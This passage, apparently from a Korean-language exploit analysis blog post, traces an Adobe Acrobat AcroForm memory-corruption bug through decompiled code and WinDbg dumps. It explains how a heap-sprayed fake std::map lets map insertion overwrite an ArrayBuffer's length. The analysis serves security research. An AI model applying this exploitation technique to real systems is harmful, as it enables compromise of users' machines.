    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt; )
    {
      v4 = (_DWORD *)&lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v14, v12);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      CAgg::Convert((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, (_DWORD *)&lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;);
      v4 = (_DWORD *)&lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2a, &amp;amp;someID);&lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;map&lt;/span&gt;
    }
    result = *v4 + &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC774; &amp;#xC131;&amp;#xACF5;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;EScript_ESObjectEnum_CallbackProc&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xCC98;&amp;#xB7FC; &amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xCEE8;&amp;#xD2B8;&amp;#xB864;&amp;#xB418;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &lt;code&gt;CAgg::operator[]&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;00001&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt; ebx=&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ecx=&lt;span class=&#34;hljs-number&#34;&gt;2909&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;478&lt;/span&gt; edx=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;60&lt;/span&gt;da&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; esi=&lt;span class=&#34;hljs-number&#34;&gt;71&lt;/span&gt;eaef&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; edi=&lt;span class=&#34;hljs-number&#34;&gt;2909&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;478&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;63&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;b esp=&lt;span class=&#34;hljs-number&#34;&gt;0457&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt; ebp=&lt;span class=&#34;hljs-number&#34;&gt;0457&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;28&lt;/span&gt; iopl=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;         nv up ei pl zr na pe nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;0023&lt;/span&gt;  ss=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b  ds=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b  es=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b  fs=&lt;span class=&#34;hljs-number&#34;&gt;0053&lt;/span&gt;  gs=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b             efl=&lt;span class=&#34;hljs-number&#34;&gt;00200246&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;AcroForm&lt;/span&gt;!DllUnregisterServer+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;69&lt;/span&gt;eb:
&lt;span class=&#34;hljs-attribute&#34;&gt;63ac2a4b&lt;/span&gt; e&lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;410000&lt;/span&gt;      call    AcroForm!DllUnregisterServer+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xab&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;b (&lt;span class=&#34;hljs-number&#34;&gt;63&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;b)
&lt;span class=&#34;hljs-attribute&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;000&lt;/span&gt;&amp;gt; dd ecx // ecx+&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; == this-&amp;gt;map
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d478&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;50504&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;f *&lt;span class=&#34;hljs-number&#34;&gt;20000058&lt;/span&gt;* &lt;span class=&#34;hljs-number&#34;&gt;54545353&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d488&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;56565555&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;58585757&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5959&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d498&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;60605&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;f &lt;span class=&#34;hljs-number&#34;&gt;00006161&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4a8&lt;/span&gt;  b&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;fe&lt;span class=&#34;hljs-number&#34;&gt;1536&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;002000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;42424141&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;44444343&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4b8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;46464545&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48484747&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;4949&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;b
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4c8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;50504&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;f &lt;span class=&#34;hljs-number&#34;&gt;20000058&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;54545353&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4d8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;56565555&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;58585757&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5959&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4e8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;60605&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;f &lt;span class=&#34;hljs-number&#34;&gt;00006161&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::operator[]&lt;/code&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &lt;code&gt;this-&amp;gt;map&lt;/code&gt;&amp;#xC740; &amp;#xD799; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; 0x20000048&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xACE0;  0x20000048&amp;#xC5D0; 0x10 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC758; &amp;#xD5E4;&amp;#xB354;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD574;&amp;#xC788;&amp;#xC73C;&amp;#xBA70; 0x20000058&amp;#xBD80;&amp;#xD130; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB294; &amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xC0AC;&amp;#xC804;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs basic&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;000&lt;/span&gt;&amp;gt; dd &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x20000048
&lt;span class=&#34;hljs-symbol&#34;&gt;20000048 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0000&lt;/span&gt;ffe8 &lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;c7bbe0 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;20000058 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;20000060&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;41424345&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;41424344&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;20000044&lt;/span&gt; // &lt;span class=&#34;hljs-number&#34;&gt;20000058&lt;/span&gt; : this-&amp;gt;map
&lt;span class=&#34;hljs-symbol&#34;&gt;20000068 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;20000078 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC911; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; &amp;#xAE38;&amp;#xC774;&amp;#xB97C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xC624;&amp;#xD504;&amp;#xC14B; + 0x4&amp;#xC778; 0x2000004c&amp;#xB85C; &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::operator[]&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; 0x20000058&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; fake &lt;code&gt;map&lt;/code&gt;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC640; &lt;code&gt;insert&lt;/code&gt;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xBCC0;&amp;#xC870;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;std-map-operator&#34;&gt;&lt;a href=&#34;#std-map-operator&#34; class=&#34;headerlink&#34; title=&#34;std::map::operator[]&#34;&gt;&lt;/a&gt;std::map&lt;unsigned short,cagg&gt;::operator[]&lt;/unsigned&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](TREE_VAL *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *pSomeID)
{
	...
	&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v8[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]
  ...
  &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::lower_bound(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, v8, pSomeID);
  v4 = v9;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( sub_208E95F2(v9, pSomeID) )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;_Mysize == &lt;span class=&#34;hljs-number&#34;&gt;0x38E38E3&lt;/span&gt; )
      Throw_tree_length_error();
    ...
    *(_DWORD *)a2 = &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::insert(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, v8[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;], (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v8[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;], Parent);
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xC5B4; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;(&lt;code&gt;a2&lt;/code&gt;)&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD55C; &lt;code&gt;v8&lt;/code&gt;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC501;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;std-map-lower-bound&#34;&gt;&lt;a href=&#34;#std-map-lower-bound&#34; class=&#34;headerlink&#34; title=&#34;std::map::lower_bound&#34;&gt;&lt;/a&gt;std::map&lt;unsigned short,cagg&gt;::lower_bound&lt;/unsigned&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;_DWORD *__thiscall &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::lower_bound(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a3)
{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Myhead; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Parent; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 v5; &lt;span class=&#34;hljs-comment&#34;&gt;// si&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// TREE_VAL *this&lt;/span&gt;
  Myhead = *(_DWORD *)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;;                     &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;_Myhead;&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//    mov     eax,dword ptr [ecx]  ds:002b:20000058=20000060&lt;/span&gt;
  Parent = *(_DWORD *)(*(_DWORD *)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);    &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;_Myhead-&amp;gt;_Parent&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//    mov     ecx,dword ptr [eax+4] ds:002b:20000064=20000044&lt;/span&gt;
  a2[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  *a2 = Parent;
  a2[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = Myhead;
  ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; a2;                                    
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Myhead&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;this&lt;/code&gt;(0x20000058)&amp;#xC5D0;&amp;#xC11C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; 0x20000060&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &lt;code&gt;Myhead-&amp;gt;_Parent&lt;/code&gt;(0x20000064)&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; 0x20000044&amp;#xAC00; &lt;code&gt;Parent&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC758; &amp;#xD638;&amp;#xCD9C; &amp;#xACB0;&amp;#xACFC; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD55C; &lt;code&gt;v8&lt;/code&gt;&amp;#xC758; 0, 1, 2 &amp;#xC778;&amp;#xB371;&amp;#xC2A4;&amp;#xC5D0; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;Parent&lt;/code&gt;(0x20000044), 0, &lt;code&gt;Myhead&lt;/code&gt;(0x20000060) &amp;#xAC12;&amp;#xC774; &amp;#xC4F0;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;std-map-insert&#34;&gt;&lt;a href=&#34;#std-map-insert&#34; class=&#34;headerlink&#34; title=&#34;std::map::insert&#34;&gt;&lt;/a&gt;std::map&lt;unsigned short,cagg&gt;::insert&lt;/unsigned&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::insert(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a3, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *a4)
{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *Myhead; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *v5; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *v6; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v8; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *v9; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v10; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;

  ++&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];                                    &lt;span class=&#34;hljs-comment&#34;&gt;// ++this-&amp;gt;_Mysize;&lt;/span&gt;
  Myhead = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)*&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;;                        &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;_Myhead&lt;/span&gt;
  v5 = a4;
  a4[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2;                              &lt;span class=&#34;hljs-comment&#34;&gt;// a4-&amp;gt;_Parent = a2&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a2 != Myhead )
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a3 )&lt;span class=&#34;hljs-comment&#34;&gt;// a3 == 0&lt;/span&gt;
    {
      ...
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
	    a2[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a4;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( a2 == (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)Myhead[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;] )
